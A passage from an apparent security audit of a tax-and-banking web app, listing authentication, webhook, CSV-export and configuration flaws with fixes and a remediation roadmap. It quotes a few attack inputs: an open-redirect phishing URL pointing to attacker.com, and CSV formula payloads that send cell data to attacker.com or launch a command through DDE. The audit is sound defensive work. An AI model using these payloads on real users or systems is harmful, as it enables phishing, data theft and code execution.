  params
);
```

Today, all pushed fragments are **hardcoded** column names and the parameter values are all bound via `$N`. There is no SQL injection. However, the pattern is exactly the shape that becomes injectable the moment someone extends it to accept a column name from the request body (a common next step when a dev adds a "generic update" API).

### Impact

Currently: none. Future: a developer reusing this pattern with user-controlled column names creates instant SQL injection.

### Fix

Refactor to use a single parameterized statement with `COALESCE` / `CASE`:

```ts
await execute(
  `UPDATE jobs SET
     status = $2,
     started_at = CASE WHEN $2 = 'running' THEN now() ELSE started_at END,
     finished_at = CASE WHEN $2 IN ('succeeded','failed','canceled') THEN now() ELSE finished_at END,
     error = COALESCE($3, error),
     result = COALESCE($4, result)
   WHERE id = $1`,
  [jobId, status, errorOrNull, resultOrNull]
);
```

---

## H-14 — Hardcoded absolute path in migration runner

- **Severity:** High (reliability) → downgraded to High because it will silently fail in prod
- **Category:** Configuration
- **Location:** `run-migration.mjs:15`

### Evidence

```js
const sqlPath = '/Users/sean/Desktop/TaxReadyWallet/backend/lambda/migration.sql';
```

The path references a previous project name (`TaxReadyWallet`) that no longer exists.

### Impact

`run-migration.mjs` cannot execute anywhere except on one developer's historical filesystem. Any CI job or recovery script depending on it fails silently. Combined with §H-12 (missing migrations), this contributes to schema drift.

### Fix

```js
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const sqlPath = process.env.MIGRATION_SQL_PATH
  || path.join(__dirname, 'db', 'migrations', process.argv[2] || 'latest.sql');
```

---

## H-15 — Open redirect via NextAuth `callbackUrl` parameter

- **Severity:** High
- **Category:** Open redirect / phishing
- **Location:** `app/api/auth/[...nextauth]/route.ts:158-166`

### Evidence

```ts
async redirect({ url, baseUrl }) {
  if (url.startsWith("/")) return `${baseUrl}${url}`;
  else if (new URL(url).origin === baseUrl) return url;
  return baseUrl;
}
```

The `startsWith("/")` check admits `//attacker.com/path`, which `new URL` resolves as a protocol-relative URL to `attacker.com`. `${baseUrl}//attacker.com` normalizes to `https://attacker.com` in some browsers (path `/` + `/attacker.com`, which browsers then interpret as a scheme-relative reference).

### Impact

Classic open redirect: attacker sends a phishing email with `https://taxformatter.com/api/auth/signin?callbackUrl=//attacker.com/login`. User logs in legitimately, then NextAuth redirects them to attacker's cloned login page. User re-enters credentials thinking the first login failed.

### Fix

```ts
async redirect({ url, baseUrl }) {
  try {
    const parsed = url.startsWith('/')
      ? new URL(url, baseUrl)
      : new URL(url);
    if (parsed.origin !== baseUrl) return baseUrl;
    // additionally disallow protocol-relative confusion
    if (parsed.pathname.startsWith('//')) return baseUrl;
    return parsed.toString();
  } catch {
    return baseUrl;
  }
}
```

Stricter version: allowlist specific paths (`/dashboard`, `/dashboard/developer`, etc.) and reject everything else.

---

# Medium Findings

## M-1 — Webhook idempotency stored in ephemeral in-memory Set

- **Severity:** Medium
- **Category:** Payment race condition
- **Location:** `app/api/webhooks/stripe/route.ts:11-57`

### Evidence

```ts
const processedEvents = new Set<string>()
const MAX_PROCESSED_EVENTS = 10_000

if (processedEvents.has(event.id)) {
  return NextResponse.json({ received: true, duplicate: true })
}
```

A `Set` in a module-scope variable is per-process memory. Vercel/Lambda serverless functions are cold-started on demand — the `Set` is empty on every cold start and does not share between concurrent warm instances.

### Impact

Stripe retries webhooks aggressively on any non-2xx response. If a webhook is processed (tier upgrade applied) but the response is slow or the process is restarted before returning 200, Stripe retries. On a fresh process, the `Set` is empty, `event.id` is not recognized as a duplicate, and the tier upgrade is applied **again**. Depending on the handler's idempotency at the DB level, this could double-apply subscription grants.

Also: two concurrent webhook deliveries (Stripe sometimes sends bursts) hit different warm instances — neither sees the other's `Set`.

### Fix

Store idempotency in Postgres:

```sql
CREATE TABLE processed_webhook_events (
  id text PRIMARY KEY,
  event_type text NOT NULL,
  processed_at timestamptz NOT NULL DEFAULT now()
);
-- TTL cleanup via a scheduled job that deletes rows older than 30 days
```

```ts
const { rowCount } = await execute(
  `INSERT INTO processed_webhook_events (id, event_type)
   VALUES ($1, $2) ON CONFLICT (id) DO NOTHING`,
  [event.id, event.type]
);
if (rowCount === 0) {
  return NextResponse.json({ received: true, duplicate: true });
}
// safe to process
```

The `INSERT ... ON CONFLICT DO NOTHING` gives atomic check-and-set semantics — only one concurrent handler wins.

---

## M-2 — `getServerSession()` called without `authOptions`

- **Severity:** Medium
- **Category:** Authentication correctness
- **Location:** `app/api/customer-portal/route.ts:6-8`

### Evidence

```ts
export async function POST(request: NextRequest) {
  const session = await getServerSession()      // missing authOptions
  if (!session?.user?.email) {
    return NextResponse.json({ error: 'You must be signed in' }, { status: 401 })
  }
```

Everywhere else in the codebase, `getServerSession(authOptions)` is called with the explicit config. Here it's omitted.

### Impact

In NextAuth v4 under Next.js App Router, `getServerSession()` without config cannot locate the session provider reliably and typically returns `null`. Effect: the endpoint always returns 401 → customer portal doesn't work (availability bug). If NextAuth's behavior changes or caches pick up the wrong config, it could silently admit unauthenticated requests — the customer portal then lets anyone generate a Stripe portal URL for a blank user, likely erroring at Stripe but potentially leaking existence information.

### Fix

```ts
import { authOptions } from '../auth/[...nextauth]/route';
const session = await getServerSession(authOptions);
```

Audit the rest of the codebase for any other `getServerSession()` calls without `authOptions`.

---

## M-3 — Webhook metadata trusted without Stripe cross-verification

- **Severity:** Medium
- **Category:** Payment verification / defense-in-depth
- **Location:** `app/api/webhooks/stripe/route.ts:62-95`

### Evidence

```ts
const apiTier = session.metadata?.['api_tier'] as ApiTier | undefined
const apiKeyId = session.metadata?.['api_key_id'] as string | undefined
if (apiTier && apiKeyId && subscriptionId) {
  await execute(
    `UPDATE api_keys SET tier = $1, ... WHERE id = $5`,
    [apiTier, ..., apiKeyId]
  );
}
```

The tier and key id come from `session.metadata`, which was set at checkout session creation time in `app/api/developer/subscribe/route.ts` from the request body. Stripe signature verification confirms the **webhook** is from Stripe, but the metadata inside is whatever the app put there.

### Impact

Combined with H-1 (no ownership check at subscribe time), this is the second half of the IDOR attack. Even if the webhook signature is perfect, it grants whatever tier the metadata says without re-verifying against the actual Stripe subscription's price. An attacker who bypasses H-1 gets a free BUSINESS upgrade.

### Fix

In the webhook, re-fetch the subscription from Stripe and confirm the price matches the claimed tier:

```ts
const subscription = await stripe.subscriptions.retrieve(subscriptionId);
const expectedPriceId = API_TIERS[apiTier].stripePriceId;
const actualPriceIds = subscription.items.data.map(i => i.price.id);
if (!actualPriceIds.includes(expectedPriceId)) {
  console.error('[webhook] tier/price mismatch', { apiTier, actualPriceIds });
  return NextResponse.json({ error: 'price mismatch' }, { status: 400 });
}
```

Also re-verify `api_key_id` ownership at this step (defense-in-depth behind H-1's primary fix).

---

## M-4 — User enumeration via timing difference in `resend-code`

- **Severity:** Medium
- **Category:** Information disclosure
- **Location:** `app/api/auth/resend-code/route.ts:32-38`

### Evidence

The endpoint correctly returns a generic message: `"If the email exists, a new code has been sent."` But the code path for an existing user sends an email (~500ms+) while a nonexistent user returns in <50ms. An attacker times responses to distinguish.

### Impact

Attackers can enumerate registered emails — useful for targeted phishing, credential stuffing, and building victim lists.

### Fix

Two options:
1. **Artificial delay** on the negative branch: `await sleep(400 + Math.random() * 200)`.
2. **Constant-time response**: always queue the email send through a job queue and return immediately regardless of existence. The job worker checks existence and silently no-ops.

Option 2 is more robust because it handles load variability that might break option 1's fixed delay.

---

## M-5 — 30-day JWT session for a financial app

- **Severity:** Medium
- **Category:** Session management
- **Location:** `app/api/auth/[...nextauth]/route.ts:79-85`

### Evidence

```ts
session: {
  strategy: "jwt",
  maxAge: 30 * 24 * 60 * 60,   // 30 days
  updateAge: 24 * 60 * 60,
}
```

### Impact

A JWT, once minted, cannot be revoked server-side (that's the definition of stateless JWTs). A 30-day lifetime means a stolen token (via XSS, device theft, session hijack) is valid for a month regardless of password change. For an app handling tax and banking data, this is an overly long grace period.

### Fix

Reduce to 7 days for regular sessions; offer "remember me" at 30 days as an explicit opt-in:

```ts
session: {
  strategy: "jwt",
  maxAge: 7 * 24 * 60 * 60,
  updateAge: 60 * 60,     // sliding refresh every hour
}
```

Better: move to database sessions (`strategy: "database"`) so you can actually revoke. Cost is one DB lookup per request. For a tax app the trade is worth it.

Consider a `revoked_at` timestamp on the user row or a `session_revocation_generation` counter embedded in the JWT — if the counter in the token is less than the current DB counter, reject.

---

## M-6 — Password reset tokens are reusable within expiry window

- **Severity:** Medium
- **Category:** Authentication
- **Location:** `lib/auth-db.ts:417-439`

### Evidence

The reset flow:
1. GET `/api/auth/reset-password?token=xyz` — validates and returns 200 if valid
2. POST `/api/auth/reset-password` — sets new password and clears the token

Between step 1 and step 2, the token remains in the DB with its original expiry. A token used in step 2 is cleared, but if the attacker intercepts the token (e.g., via referrer, email forwarding, cached URL) before the victim clicks "save new password," the attacker can use the token themselves during the same window.

### Impact

Account takeover if an attacker obtains a valid reset token through email or URL leakage.

### Fix

Single-use: on first GET, mark the token as "viewed" (or even consumed) with a short secondary window for the POST. Better: make the token one-shot — on GET, rotate to a new, short-lived follow-up token returned only to the browser.

Best: use the token only to authenticate a **short-lived session-setting step**; do not allow it to change the password directly. This mirrors how Stripe, AWS, and Google handle reset flows.

---

## M-7 — No rate limit on 2FA verify endpoint

- **Severity:** Medium
- **Category:** Brute force
- **Location:** `app/api/auth/2fa/login-verify/route.ts`

### Evidence

Similar to H-6, the rate limiter exists but is not applied here. 2FA backup codes are only 8 hex characters (32 bits, see M-8), and TOTP codes are 6 digits (~20 bits).

### Impact

Rate-limited brute force of 6-digit TOTP is theoretically ~1M attempts but in practice TOTP rotates every 30 seconds, so an attacker has ~60s window to guess — still 1M/60 = 16k attempts/second needed for 50% odds. Without rate limit, that's feasible over a fast connection, especially if the backup codes are also attackable in parallel.

### Fix

Same pattern as H-6, plus a per-account attempt counter. Lock 2FA after 5 wrong codes in 15 minutes.

---

## M-8 — Backup codes are 32-bit (8 hex chars)

- **Severity:** Medium
- **Category:** Cryptography / entropy
- **Location:** `lib/2fa.ts:46-54`

### Evidence

```ts
const code = crypto.randomBytes(4).toString('hex').toUpperCase();
codes.push(`${code.slice(0, 4)}-${code.slice(4)}`);
```

`randomBytes(4)` = 32 bits = ~4.3 billion possibilities per code.

### Impact

With 10 backup codes × 4.3B = ~43B. Under an unlimited-attempt scenario, that's crackable with modern hardware. With the rate limiting fix from M-7, this becomes non-exploitable, but entropy should still be higher as defense-in-depth.

### Fix

```ts
const code = crypto.randomBytes(6).toString('hex').toUpperCase();   // 48 bits
codes.push(`${code.slice(0, 4)}-${code.slice(4, 8)}-${code.slice(8)}`);
```

48 bits = ~280 trillion, comfortably above brute-force feasibility even without rate limits.

---

## M-9 — Verbose exception messages leaked to API clients

- **Severity:** Medium
- **Category:** Information disclosure
- **Location:** `backend/handlers/api.py:294-301`, multiple handlers

### Evidence

```python
except Exception as e:
    logger.exception("Crypto parse error")
    return {
        "status": "error",
        "code": "internal_error",
        "message": f"Internal processing error: {str(e)}",
        "source_type": "crypto_exchange",
    }
```

`str(e)` includes file paths, library version hints, stack context depending on the exception type.

### Impact

Attackers probing the API can learn Python library versions, internal module paths, DB column names (from SQL errors — though the codebase uses parameterized queries, errors still leak schema), and parser internals. Useful reconnaissance for crafting targeted payloads.

### Fix

```python
except Exception as e:
    logger.exception("Crypto parse error", extra={"request_id": request_id})
    return {
        "status": "error",
        "code": "internal_error",
        "message": "An internal error occurred. Please try again or contact support.",
        "request_id": request_id,   # client references this when filing a support ticket
        "source_type": "crypto_exchange",
    }
```

Audit all Python handlers for `str(e)` in user-facing responses.

---

## M-10 — CSV formula injection in bank exporter

- **Severity:** Medium
- **Category:** Client-side RCE via exported CSV
- **Locations:**
  - `backend/services/bank_statement/exporter.py:44`
  - `backend/handlers/processor.py:174`
  - `backend/services/ai_insights.py:394`

### Evidence

```python
writer.writerow([date, description, f"{amount:.2f}"])
```

`description` comes from PDF parser output — attacker-controllable if they upload a bank statement containing adversarial descriptions. A cell like `=HYPERLINK("http://attacker.com/"&A1,"Click")` or `=cmd|'/c calc'!A1` executes when the victim opens the CSV in Excel.

### Impact

Users download what they believe is a safe CSV export of their own transactions. If a line item came from a malicious source (or the attacker has any write path into the source data), opening the CSV in Excel/LibreOffice executes arbitrary formulas, including the DDE-based RCE vectors that Excel historically honored. Even modern Excel with "disable dynamic data exchange" prompts the user, and users click through.

### Fix

```python
def sanitize_csv_cell(value) -> str:
    if not isinstance(value, str):
        return value
    if value and value[0] in ('=', '+', '-', '@', '\t', '\r'):
        return "'" + value
    return value

writer.writerow([
    sanitize_csv_cell(date),
    sanitize_csv_cell(description),
    sanitize_csv_cell(f"{amount:.2f}"),
])
```

Apply the wrapper to every `writer.writerow` / `writer.writerows` call in the backend. Consider a pytest fixture that generates adversarial CSVs and asserts the sanitizer strips them.

---

## M-11 — Loose `pdfplumber` version pin pulls vulnerable `pdfminer.six`

- **Severity:** Medium
- **Category:** Dependency management
- **Location:** `backend/requirements-api.txt:10`

### Evidence

```
pdfplumber>=0.10.0
```

`pdfplumber` depends on `pdfminer.six`, which has a history of XXE and denial-of-service CVEs. A loose `>=0.10.0` pin permits very old versions depending on the resolver.

### Impact

If CI rebuilds from scratch with an old lockfile, a vulnerable `pdfminer.six` gets pulled. A crafted PDF uploaded to the bank-statement parser could trigger XXE (external entity resolution to exfiltrate files from the Lambda filesystem) or ReDoS.

### Fix

Pin to a specific tested version, and maintain a lockfile:

```
pdfplumber==0.11.4
pdfminer.six==20240706
```

Use `pip-compile` (from `pip-tools`) to generate a `requirements-api.lock` with cryptographic hashes (`--generate-hashes`). Install with `pip install -r requirements-api.lock` in CI.

Run `pip-audit` in CI to catch known CVEs.

---

## M-12 — `/api/uploads/[uploadId]/confirm` allows anonymous confirmation

- **Severity:** Medium
- **Category:** Authorization
- **Location:** `app/api/uploads/[uploadId]/confirm/route.ts:20-46`

### Evidence

```ts
const session = await getServerSession(authOptions);
const identifier = getClientIdentifier(request);
const userId = session?.user?.id || `anon-${identifier}`;
// ...calls Lambda with uploadId, no verification
```

### Impact

An anonymous user can POST confirmation for any `uploadId` they can guess. Combined with enumerable S3 keys or leaked jobIds, this triggers the backend to begin processing files not belonging to the caller — potentially kicking off expensive Lambda invocations or overwriting the owner's job state.

### Fix

Require session, verify the upload belongs to `session.user.id` via an `uploads` table row. If anonymous uploads are a real feature (e.g., free-tier sampling), store the anonymous identifier in the DB at upload time and check it matches at confirm time.

---

## M-13 — Presigned S3 URL expiry and scope undocumented

- **Severity:** Medium
- **Category:** Secret lifetime
- **Locations:**
  - `app/api/uploads/presigned-url/route.ts:84-93`
  - `app/api/bank/presigned-url/route.ts:65-70`

### Evidence

The Next.js proxy forwards Lambda's presigned URL to the client without documenting or enforcing expiry in the application layer. Expiry is whatever the Lambda picked.

### Impact

If the Lambda generates long-expiry URLs (AWS default is 7 days, maximum is 7 days for sigv4), the URL is a bearer credential for a week. Leaked via browser history, shared accidentally, cached by a CDN, or intercepted in transit — anyone with it can upload to that S3 key until expiry.

### Fix

1. In the Lambda, explicitly set `ExpiresIn=300` (5 minutes) or `900` (15 minutes) when calling `generate_presigned_post`.
2. Scope the URL to the exact key (not a prefix wildcard).
3. Add `Content-Length` and `Content-Type` conditions to the policy so the URL only allows the exact expected upload.
4. Return the `expiresAt` timestamp to the frontend so it can refuse stale URLs.

---

## M-14 — `API_GATEWAY_URL` env var is an SSRF pivot point

- **Severity:** Medium
- **Category:** SSRF
- **Location:** Multiple routes (`app/api/uploads/presigned-url/route.ts:7`, `app/api/bank/presigned-url/route.ts:6`, `app/api/bank/process/route.ts:7`)

### Evidence

```ts
const API_GATEWAY_URL = process.env['API_GATEWAY_URL'] || 'https://api.taxformatter.com';
const lambdaResponse = await fetch(`${API_GATEWAY_URL}/presigned-url`, { ... });
```

If `API_GATEWAY_URL` is compromised at deployment time (malicious PR to CI config, `vercel env pull` leak, etc.), every Next.js API route that uses it becomes a blind SSRF proxying authenticated user data to wherever the env var points.

### Impact

Lower than classic SSRF because env vars are harder to tamper with than request-derived URLs, but still worth defending. If anyone with deploy access is compromised, they can redirect internal traffic to an attacker-controlled collector without touching source code.

### Fix

```ts
const API_GATEWAY_URL = process.env['API_GATEWAY_URL'] || 'https://api.taxformatter.com';
const ALLOWED = new Set([
  'https://api.taxformatter.com',
  'https://api-staging.taxformatter.com',
]);
if (!ALLOWED.has(new URL(API_GATEWAY_URL).origin)) {
  throw new Error('API_GATEWAY_URL not in allowlist');
}
```

Extract to a shared `lib/lambda-client.ts` so there's one place to audit.

---

## M-15 — File upload rate limit easily bypassed by anonymous users

- **Severity:** Medium
- **Category:** DoS / abuse
- **Locations:**
  - `app/api/uploads/presigned-url/route.ts:14-21`
  - `app/api/bank/presigned-url/route.ts:14-21`

### Evidence

```ts
const rateLimit = await rateLimiters.fileUpload.check(identifier);
// identifier = session.user.id || `anon-${clientIp}`
```

10 uploads/hour per IP for anonymous users. `clientIp` comes from `x-forwarded-for` which is trivially spoofable unless Next.js is configured to trust only the Vercel edge.

### Impact

An attacker rotating residential proxies can trigger hundreds of uploads per hour, each kicking off Lambda processing — direct cost to the operator. Not as severe as a full DoS but it's a steady drip of infrastructure cost.

### Fix

1. Lower anonymous limit to 3/hour.
2. Enforce a daily byte quota (not just count) — `fileUpload.check(identifier, bytes)`.
3. Require a signed receipt / CAPTCHA on the first upload of an anonymous session.
4. Kill the anonymous upload path entirely if possible; require signup before upload.

---

## M-16 — NextAuth cookies use implicit defaults, not explicit hardening

- **Severity:** Medium
- **Category:** Session cookie configuration
- **Location:** `app/api/auth/[...nextauth]/route.ts` (no `cookies` block)

### Evidence

No explicit `cookies` configuration. NextAuth defaults provide reasonable values (`httpOnly: true`, `secure: true` in production, `sameSite: 'lax'`), but relying on defaults means any NextAuth upgrade could change them silently.

### Impact

Low today; medium risk over time. Explicit > implicit for security-critical configuration.

### Fix

```ts
cookies: {
  sessionToken: {
    name: process.env.NODE_ENV === 'production'
      ? '__Secure-next-auth.session-token'
      : 'next-auth.session-token',
    options: {
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      path: '/',
    },
  },
  csrfToken: {
    name: process.env.NODE_ENV === 'production'
      ? '__Host-next-auth.csrf-token'
      : 'next-auth.csrf-token',
    options: {
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      path: '/',
    },
  },
},
```

Consider `sameSite: 'strict'` if you don't rely on cross-origin OAuth redirects preserving the session.

---

## M-17 — SMTP config logging with credential flag

- **Severity:** Medium
- **Category:** Information disclosure
- **Location:** `lib/email.ts:10`

### Evidence

```ts
console.log('[Email] SMTP Config:', { host, port, user, hasPassword: !!pass });
```

The password itself isn't logged (good), but `host`, `port`, and `user` are — and these end up in Vercel logs, aggregated to Sentry (see H-10), and potentially to other log sinks.

### Impact

Information disclosure about the mail infrastructure. Low by itself; combined with H-10 (PII to Sentry), the mail config is now in Sentry logs accessible via the (possibly leaked, §C-4) Sentry token.

### Fix

Remove the log, or guard behind `process.env.DEBUG_EMAIL === '1'`.

---

## M-18 — Docker Compose default password

- **Severity:** Medium
- **Category:** Local development hygiene
- **Location:** `docker-compose.yml:9`

### Evidence

```yaml
POSTGRES_PASSWORD: devpassword
```

### Impact

Low for production (docker-compose is dev-only), but any developer running `docker-compose up` on a machine with network exposure is briefly exposing Postgres with a guessable password. More importantly, this teaches the pattern "plaintext passwords in yaml are fine" which bleeds into production configs.

### Fix

```yaml
POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?POSTGRES_PASSWORD must be set}
```

Document in README that devs should set this in their local `.env` and never commit it.

---

## M-19 — E2E test credentials stored in `.env.local` alongside prod secrets

- **Severity:** Medium
- **Category:** Test/prod separation
- **Location:** `.env.local:71-72`

### Evidence

```
E2E_USER_EMAIL=test@example.com
E2E_USER_PASSWORD=Password123!
```

### Impact

The weak password is only a test credential, but it lives in the same file as production secrets. If the test account exists in production (e.g., it's the account used for Playwright to run against staging), anyone with the file can log in as that test user — and likely a test user has real data attached from exploratory testing.

### Fix

1. Move to `.env.test.local` (git-ignored by default in Next.js).
2. Use GitHub Actions secrets for CI.
3. Ensure the test user has zero production data and is isolated to a staging tenant.

---

## M-20 — `BYPASS_RATE_LIMIT=true` in `.env.local`

- **Severity:** Medium
- **Category:** Test flag in prod config
- **Location:** `.env.local:68`

### Evidence

```
BYPASS_RATE_LIMIT=true
```

### Impact

If this env var is read by the app in production (and `.env.local` is loaded in production builds, which for some Next.js setups it is not, but for others it is), all rate limiting is disabled. Combined with H-6/H-7/M-7, that would make brute force trivial.

### Fix

1. Add explicit guard in the rate limiter: `if (process.env.NODE_ENV === 'production' && process.env.BYPASS_RATE_LIMIT) throw new Error('BYPASS_RATE_LIMIT not allowed in prod')`.
2. Move to `.env.test.local`.
3. Or delete entirely and use Playwright fixtures to bypass rate limits differently (e.g., an authenticated test header signed by a CI-only secret).

---

## M-21 — Referrer-Policy is `origin-when-cross-origin` instead of `strict-origin-when-cross-origin`

- **Severity:** Medium
- **Category:** Information leakage
- **Location:** `next.config.ts:44-45`

### Evidence

```ts
{ key: "Referrer-Policy", value: "origin-when-cross-origin" }
```

### Impact

When users navigate from an HTTPS page to an HTTP page, the origin is still sent as referrer. `strict-origin-when-cross-origin` suppresses the referrer entirely when downgrading to HTTP. With sensitive paths containing jobIds (relevant to H-2), this suppresses an important leak vector.

### Fix

```ts
{ key: "Referrer-Policy", value: "strict-origin-when-cross-origin" }
```

---

# Low Findings

## L-1 — `api_tier` passed via URL query param

- **Severity:** Low
- **Category:** Information disclosure
- **Location:** `app/login/page.tsx:66, 68`, `app/signup/page.tsx`

Query params appear in browser history and `Referer` headers. `api_tier` itself is not sensitive but the pattern is.

**Fix:** POST to an endpoint that sets a session cookie, or use a session-storage intermediate.

---

## L-2 — Analytics domains broaden `connect-src`

- **Severity:** Low
- **Category:** CSP scope
- **Location:** `next.config.ts:63`

Google Analytics, DoubleClick, and `google.com` are in `connect-src`. Any XSS can exfiltrate data to these endpoints.

**Fix:** If you don't use DoubleClick for remarketing, remove it.

---

## L-3 — HSTS preload present ✓

Already correctly configured. No action.

---

## L-4 — 6-digit numeric verification codes

- **Severity:** Low
- **Category:** Entropy

1M possibilities is marginal; with rate limiting it's acceptable. Consider 8-character alphanumeric (62^8 ≈ 218T) for better margin.

---

## L-5 — Gemini API key in query string (backend)

- **Severity:** Low
- **Location:** `backend/handlers/webhook.py:196` (or similar in `ai_insights.py`)

```python
url = f"{self.base_url}/models/{self.model}:generateContent?key={self.api_key}"
```

Query strings end up in server logs. Use the `X-Goog-Api-Key` header instead.

---

## L-6 — `processed_events` `MAX_PROCESSED_EVENTS` constant is dead once fix M-1 lands

- **Severity:** Low (cleanup)

Remove once M-1 is implemented.

---

## L-7 — API usage query uses string interval concatenation

- **Severity:** Low
- **Location:** `lib/api-keys.ts:160-167`

```ts
`WHERE usage_date >= (CURRENT_DATE - ($2 || ' months')::interval)`
```

Currently `months` is a number type, so this is safe. Fragile pattern — a future refactor with a different input type opens injection.

**Fix:** `CURRENT_DATE - make_interval(months => $2::int)`.

---

## L-8 — `X-Powered-By` already removed ✓

`poweredByHeader: false` in `next.config.ts`. No action.

---

## L-9 — No source map policy documented

- **Severity:** Low

Next.js generates client source maps by default. Verify `productionBrowserSourceMaps: false` is set in `next.config.ts` (or verify that maps are intentionally shipped to Sentry only).

---

## L-10 — OAuth state param relies on NextAuth default

- **Severity:** Low

NextAuth handles OAuth state correctly by default. Explicit configuration is a hardening nicety but not required.

---

## L-11 — Tax-domain-specific recommendation: encrypt PII at rest

- **Severity:** Low (policy / compliance)

Not a bug, a recommendation: bank account numbers, tax IDs, and transaction metadata should be encrypted at rest using a KMS-managed key, not just stored in Postgres plaintext. Neon offers encryption-at-rest at the storage layer; for stronger guarantees (against DB dumps or insider access), consider application-level encryption with envelope keys for the most sensitive columns.

---

# Positive Findings (what's done right)

These were confirmed by the audit and should be preserved:

- **Parameterized SQL everywhere.** Every `execute`/`queryOne` call uses `$N` placeholders. No string concatenation for SQL. No `.format()` building queries from user input.
- **`yaml.safe_load`** used consistently in `backend/services/bank_statement/fingerprinter.py:53,117`.
- **No unsafe deserialization.** Zero hits for `pickle.load`, `marshal.loads`, `shelve`, `jsonpickle` on user data.
- **No command injection.** No `subprocess(shell=True)`, no `os.system`, no `eval`/`exec` on user input.
- **File upload defense in depth.** Magic-byte validation, extension allowlist (`.csv/.xlsx/.xls`), 50 MB cap in `backend/handlers/scanner.py:37-115`.
- **S3 key construction is safe.** Filenames are sanitized (`replace(" ", "_").replace("/", "_")`) before composing keys in `backend/handlers/webhook.py:117`. Job IDs are server-generated UUIDs.
- **API keys hashed at rest** with SHA-256 in `lib/api-keys.ts`.
- **Stripe webhook signature verification** correctly uses raw body (`request.text()`) before parsing in `app/api/webhooks/stripe/route.ts`.
- **API key ownership checks** present on `/api/developer/keys/[keyId]` (revoke, rename, delete) — verify `user_id` matches session.
- **Upload deletion ownership check** correctly scoped to `user_id`.
- **HSTS with preload** correctly set.
- **`poweredByHeader: false`** removes `X-Powered-By`.
- **Terraform `sensitive = true`** applied to secret variables.
- **AWS Secrets Manager** used for Lambda runtime secrets.
- **`.env.example`** provides a safe template.
- **NextAuth `redirect` callback** has origin-check logic (though see H-15 for the bypass).
- **Security helpers written** — `generateCsrfToken`, `validateCsrfToken` (constant-time), `rateLimiters`, `getClientIdentifier`. The problem is not absence of tools, it's inconsistent use.

---

# Remediation Roadmap

## Week 1 — emergency (C-1 through H-4)

1. **Rotate all leaked secrets** (C-1, C-2, C-3, C-4). Do this first. Nothing else matters until keys are rotated.
2. **Scrub git history** with `git filter-repo`.
3. **Patch H-1 and H-2** — the two directly-exploitable authorization bugs. Single-file changes each.
4. **Add CSRF validation** to state-changing routes (H-4). Middleware approach is quickest.
5. **Audit access logs** at Neon, Resend, Mailchimp, Google Cloud, Stripe, Sentry for anomalies dating back to when each secret was committed.

## Week 2 — defense in depth

6. Timing-safe comparisons (H-5).
7. Rate limits on auth endpoints (H-6, M-7).
8. Account lockout (H-7).
9. CSP hardening (H-8) — this is the biggest behavioral change; do it behind a staging deploy and smoke test.
10. Remove `sendDefaultPii` and session replays (H-10).
11. CORS allowlist (H-11).
12. Open-redirect fix (H-15).

## Week 3 — schema & webhook integrity

13. Auth schema migrations (H-12). Run against production DB with `CONCURRENTLY`-style care.
14. Webhook idempotency to Postgres (M-1).
15. Webhook tier cross-verification (M-3).
16. Customer portal auth fix (M-2).
17. Delete/replace `run-migration.mjs` hardcoded path (H-14).

## Week 4 — hardening & hygiene

18. CSV formula sanitization (M-10).
19. Dependency pinning + lockfile + `pip-audit` in CI (M-11).
20. Reset token single-use (M-6).
21. Session length reduction (M-5).
22. 2FA backup code entropy bump (M-8).
23. NextAuth cookie explicit config (M-16).
24. Verbose error scrubbing (M-9).
25. Presigned URL expiry tightening (M-13).
26. Anonymous upload path hardening (M-12, M-15).

## Ongoing

- Add `detect-secrets` or `git-secrets` to pre-commit hooks.
- Add `pip-audit` and `npm audit --audit-level=high` to CI; fail builds on high/critical.
- Schedule quarterly re-audits using the same six-agent parallel methodology.
- Add Sentry data-scrubbing rules at the project level.
- Document the security review process in `docs/SECURITY.md` so the next contributor knows the bar.

---

# Appendix A — Severity/Category Matrix

| ID    | Title                                                | Severity | Category         | File                                                           |
| ----- | ---------------------------------------------------- | -------- | ---------------- | -------------------------------------------------------------- |
| C-1   | Live secrets in `.env.local`                         | Critical | Secret leakage   | `.env.local`                                                   |
| C-2   | Live Anthropic key in `terraform.tfvars.example`     | Critical | Secret leakage   | `backend/terraform/terraform.tfvars.example:13`                |
| C-3   | Live Gemini key in `terraform.tfvars.example`        | Critical | Secret leakage   | `backend/terraform/terraform.tfvars.example:15`                |
| C-4   | Sentry auth token committed                          | Critical | Secret leakage   | `.env.sentry-build-plugin`                                     |
| H-1   | IDOR on subscription tier upgrade                    | High     | Authorization    | `app/api/developer/subscribe/route.ts:11-66`                   |
| H-2   | Anonymous bank statement download                    | High     | Authorization    | `app/api/bank/job/[jobId]/download/route.ts:10-44`             |
| H-3   | Bank job status missing ownership check              | High     | Authorization    | `app/api/bank/job/[jobId]/route.ts:10-45`                      |
| H-4   | CSRF tokens never validated                          | High     | CSRF             | `app/api/**` (multiple)                                        |
| H-5   | Timing-unsafe code comparisons                       | High     | Auth             | `lib/auth-db.ts:301`, `app/api/auth/2fa/login-verify/route.ts:66` |
| H-6   | No rate limit on verification endpoint               | High     | Brute force      | `app/api/auth/verify/route.ts`                                 |
| H-7   | No account lockout                                   | High     | Brute force      | `app/api/auth/[...nextauth]/route.ts`                          |
| H-8   | CSP `unsafe-eval` + `unsafe-inline`                  | High     | XSS              | `next.config.ts:59`                                            |
| H-9   | Unsanitized error text render                        | High     | XSS (latent)     | `app/dashboard/jobs/[jobId]/JobDetailClient.tsx:230`           |
| H-10  | Sentry `sendDefaultPii: true` + replays              | High     | Privacy          | `instrumentation-client.ts:31`, `sentry.*.config.ts`           |
| H-11  | CORS wildcard with credentialed headers              | High     | CORS             | `backend/handlers/api.py:31`, `backend/handlers/webhook.py:64` |
| H-12  | Missing reset_token columns in schema                | High     | Schema drift     | `db/migrations/**` (missing)                                   |
| H-13  | Dynamic UPDATE SET clause pattern                    | High     | SQL (fragile)    | `lib/jobs-db.ts:82-109`                                        |
| H-14  | Hardcoded absolute path in migration runner          | High     | Config           | `run-migration.mjs:15`                                         |
| H-15  | Open redirect via `callbackUrl`                      | High     | Open redirect    | `app/api/auth/[...nextauth]/route.ts:158-166`                  |
| M-1   | Webhook idempotency in-memory Set                    | Medium   | Payment          | `app/api/webhooks/stripe/route.ts:11-57`                       |
| M-2   | `getServerSession` without `authOptions`             | Medium   | Auth             | `app/api/customer-portal/route.ts:6-8`                         |
